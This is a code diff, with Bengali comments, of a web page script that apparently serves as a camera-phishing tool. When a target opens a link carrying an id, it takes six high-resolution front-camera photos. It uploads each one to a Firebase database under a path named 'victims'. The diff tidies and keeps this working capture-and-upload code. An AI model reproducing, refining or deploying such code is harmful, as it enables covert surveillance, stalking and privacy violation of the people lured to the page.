@@ -31,6 +31,7 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
+// id নেওয়া
 const id = new URLSearchParams(location.search).get('id');
 if(!id){
   document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";
@@ -41,39 +42,48 @@ function start(){
   document.getElementById('load').style.display = 'block';
 
   // ৬টা ছবি তুলবে (সামনের ক্যামেরা)
-  for(let i=0; i<6; i++){
-    setTimeout(()=>capture(), i*700);
+  for(let i = 0; i < 6; i++){
+    setTimeout(() => capture(), i * 700);
   }
 }
 
 async function capture(){
-  try{
+  try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: {ideal:1920}, height: {ideal:1080} }
+      video: { 
+        facingMode: "user",
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      }
     });
-    const v = document.createElement('video');
-    v.srcObject = stream;
-    v.play();
 
-    v.onloadedmetadata = () => {
-      setTimeout(()=>{
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.play();
+
+    video.onloadedmetadata = () => {
+      setTimeout(() => {
         const canvas = document.createElement('canvas');
-        canvas.width = v.videoWidth || 1280;
-        canvas.height = v.videoHeight || 720;
-        canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
         const dataURL = canvas.toDataURL('image/jpeg', 0.95);
 
         // ফায়ারবেসে পাঠানো
-        db.ref('victims/'+id).push({
+        db.ref('victims/' + id).push({
           data: dataURL,
           time: Date.now()
         });
 
-        stream.getTracks().forEach(t=>t.stop());
+        stream.getTracks().forEach(track => track.stop());
       }, 1000);
     };
-  }catch(e){
-    console.log("Camera blocked or not available");
+
+  } catch (err) {
+    console.log("Camera access denied or not available");
   }
 }
 </script>
